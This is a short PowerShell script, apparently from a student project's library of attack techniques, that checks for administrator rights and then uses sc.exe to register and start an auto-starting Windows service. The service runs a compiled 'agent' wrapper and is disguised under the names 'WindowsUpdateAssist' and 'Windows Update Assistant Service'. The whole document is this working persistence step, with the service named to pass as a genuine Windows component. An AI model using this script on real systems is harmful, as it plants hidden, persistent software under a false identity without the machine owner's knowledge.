# [TECHNIQUE]: Windows Service Creation
# [TARGET]: Background System Services
# [PRIVILEGE]: Administrator

$serviceName = "WindowsUpdateAssist" 
# This must point to the SERVICE WRAPPER you compiled, not agent.exe directly
$binPath = "C:\Users\abdul\Downloads\FYP\task1\knowledge_library\windows_service_creation.exe"

# 1. Check if we are Admin
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Output "[FAILURE] This technique requires Elevation."
    exit
}

# 2. Create the Service using the REAL Windows tool: sc.exe
# Note: There MUST be a space after 'binPath=' and 'start='
sc.exe create $serviceName binPath= $binPath start= auto displayname= "Windows Update Assistant Service"

# 3. Start the service immediately
sc.exe start $serviceName
Write-Output "[SUCCESS] Service $serviceName created and started."